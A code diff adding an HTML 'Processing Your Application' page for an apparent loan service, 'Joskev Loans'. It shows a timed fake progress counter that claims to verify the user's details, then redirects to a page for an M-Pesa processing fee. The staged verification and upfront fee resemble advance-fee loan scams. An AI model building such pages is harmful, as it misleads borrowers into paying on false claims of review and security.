@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Processing Application - Joskev Loans</title>
+
+<style>
+/* RESET */
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    background:
+        radial-gradient(circle at top left, rgba(0,166,81,0.14), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(0,86,210,0.14), transparent 35%),
+        linear-gradient(135deg,#f6f9ff,#eef5ff);
+}
+
+/* CARD */
+.card{
+    width:100%;
+    max-width:560px;
+    background:rgba(255,255,255,0.96);
+    backdrop-filter: blur(10px);
+    border-radius:24px;
+    padding:38px 30px;
+    box-shadow:0 18px 45px rgba(0,0,0,0.12);
+    border:1px solid rgba(255,255,255,0.65);
+    position:relative;
+    overflow:hidden;
+}
+
+/* DECOR */
+.card::before{
+    content:"";
+    position:absolute;
+    top:-70px;
+    right:-70px;
+    width:180px;
+    height:180px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#00a651,#007a3d);
+    opacity:0.08;
+}
+
+.card::after{
+    content:"";
+    position:absolute;
+    bottom:-60px;
+    left:-60px;
+    width:160px;
+    height:160px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#0056d2,#003f9e);
+    opacity:0.08;
+}
+
+/* ICON */
+.icon-wrap{
+    position:relative;
+    z-index:2;
+    display:flex;
+    justify-content:center;
+    margin-bottom:22px;
+}
+
+.icon{
+    width:90px;
+    height:90px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#0056d2,#003f9e);
+    color:white;
+    font-size:42px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow:0 14px 28px rgba(0,86,210,0.25);
+}
+
+/* TITLE */
+h1{
+    position:relative;
+    z-index:2;
+    text-align:center;
+    color:#0f172a;
+    font-size:32px;
+    margin-bottom:12px;
+}
+
+.subtitle{
+    position:relative;
+    z-index:2;
+    text-align:center;
+    color:#64748b;
+    font-size:16px;
+    line-height:1.7;
+    margin-bottom:24px;
+}
+
+/* INFO BOX */
+.info-box{
+    position:relative;
+    z-index:2;
+    background:linear-gradient(135deg,#f3f8ff,#ebf3ff);
+    border:1px solid #dbeafe;
+    border-radius:18px;
+    padding:22px;
+    margin-bottom:24px;
+}
+
+.info-title{
+    color:#16a34a;
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:10px;
+}
+
+.info-text{
+    color:#475569;
+    font-size:15px;
+    line-height:1.7;
+}
+
+/* STEPS */
+.steps{
+    position:relative;
+    z-index:2;
+    margin-top:18px;
+    display:grid;
+    gap:12px;
+}
+
+.step{
+    display:flex;
+    align-items:flex-start;
+    gap:12px;
+    background:#f8fbff;
+    border:1px solid #e2e8f0;
+    border-radius:14px;
+    padding:14px 15px;
+}
+
+.step-number{
+    min-width:30px;
+    height:30px;
+    border-radius:50%;
+    background:#0056d2;
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:14px;
+    font-weight:700;
+}
+
+.step-text{
+    color:#334155;
+    font-size:14px;
+    line-height:1.6;
+}
+
+/* LOADER */
+.loader-wrap{
+    position:relative;
+    z-index:2;
+    margin-top:28px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:14px;
+}
+
+.circle-loader{
+    width:72px;
+    height:72px;
+    border:6px solid #e5e7eb;
+    border-top:6px solid #0056d2;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    0%{ transform:rotate(0deg); }
+    100%{ transform:rotate(360deg); }
+}
+
+.percent{
+    color:#0056d2;
+    font-size:15px;
+    font-weight:800;
+}
+
+.progress-text{
+    color:#64748b;
+    font-size:14px;
+    text-align:center;
+    line-height:1.6;
+}
+
+/* BADGE */
+.badge{
+    display:inline-block;
+    margin-top:8px;
+    padding:8px 12px;
+    border-radius:999px;
+    background:#f8fafc;
+    border:1px solid #e2e8f0;
+    color:#475569;
+    font-size:12px;
+}
+
+/* MOBILE */
+@media(max-width:600px){
+    .card{
+        padding:30px 20px;
+        border-radius:20px;
+    }
+
+    h1{
+        font-size:26px;
+    }
+
+    .icon{
+        width:80px;
+        height:80px;
+        font-size:36px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+    <div class="icon-wrap">
+        <div class="icon">⌛</div>
+    </div>
+
+    <h1>Processing Your Application</h1>
+
+    <p class="subtitle">
+        Please wait while we review your submitted details and prepare the next step for your loan application.
+    </p>
+
+    <div class="info-box">
+        <div class="info-title">Reviewing Your Application Details</div>
+        <div class="info-text">
+            We are currently verifying your submitted information and preparing your M-Pesa payment step.
+            Once the review is complete, you will be redirected automatically.
+        </div>
+    </div>
+
+    <div class="steps">
+        <div class="step">
+            <div class="step-number">1</div>
+            <div class="step-text">Checking the information you submitted in your loan application.</div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">2</div>
+            <div class="step-text">Preparing your M-Pesa processing fee payment prompt.</div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">3</div>
+            <div class="step-text">Redirecting you to the secure payment page to continue your application.</div>
+        </div>
+    </div>
+
+    <div class="loader-wrap">
+        <div class="circle-loader"></div>
+        <div class="percent" id="percent">0%</div>
+        <div class="progress-text">
+            Please keep this page open while we prepare the next step.
+            <div class="badge">Secure Loan Processing</div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+let percent = 0;
+const el = document.getElementById("percent");
+
+const interval = setInterval(() => {
+    percent++;
+    el.textContent = percent + "%";
+
+    if(percent >= 100){
+        clearInterval(interval);
+
+        setTimeout(() => {
+            window.location.href = "pay.html";
+        }, 700);
+    }
+}, 40);
+</script>
+
+</body>
+</html>
